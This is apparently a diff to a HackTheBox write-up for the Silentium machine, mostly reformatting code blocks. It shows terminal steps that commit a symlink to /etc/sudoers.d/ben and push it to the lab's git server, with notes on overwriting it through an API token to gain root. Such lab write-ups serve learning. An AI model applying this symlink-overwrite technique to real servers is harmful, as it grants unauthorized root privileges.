@@ -329,10 +329,14 @@ hint:
 hint: 	git branch -m <name>
 hint:
 hint: Disable this message with "git config set advice.defaultBranchName false"
+```
 
+```
   ~/HackTheBox/Silentium ❯ ls
 NMAP_SCAN  getroot  reports
+```
 
+```
   ~/HackTheBox/Silentium ❯ cd getroot 
 
   ~/HackTheBox/Silentium/getroot   master ❯ ln -s /etc/sudoers.d/ben mysymlink
@@ -343,7 +347,9 @@ drwxrwxr-x 3 light light 4096 May 12 12:26 .
 drwxrwxr-x 4 light light 4096 May 12 12:19 ..
 drwxrwxr-x 6 light light 4096 May 12 12:26 .git
 lrwxrwxrwx 1 light light   18 May 12 12:26 mysymlink -> /etc/sudoers.d/ben
+```
 
+```
   ~/HackTheBox/Silentium/getroot   master ?1 ❯ git add mysymlink
 
   ~/HackTheBox/Silentium/getroot   master +1 ❯ git commit -m "adding mysymlink" 
@@ -360,7 +366,6 @@ Username for 'http://staging-v2-code.dev.silentium.htb': spider
 Password for 'http://spider@staging-v2-code.dev.silentium.htb': 
 To http://staging-v2-code.dev.silentium.htb/spider/getroot.git
  * [new branch]      master -> master
-
 ```
 - No, we successfully committed our symlink, now let's overwrite it. 
 - Go to profile in the dashboard, and applications, create a new api token.
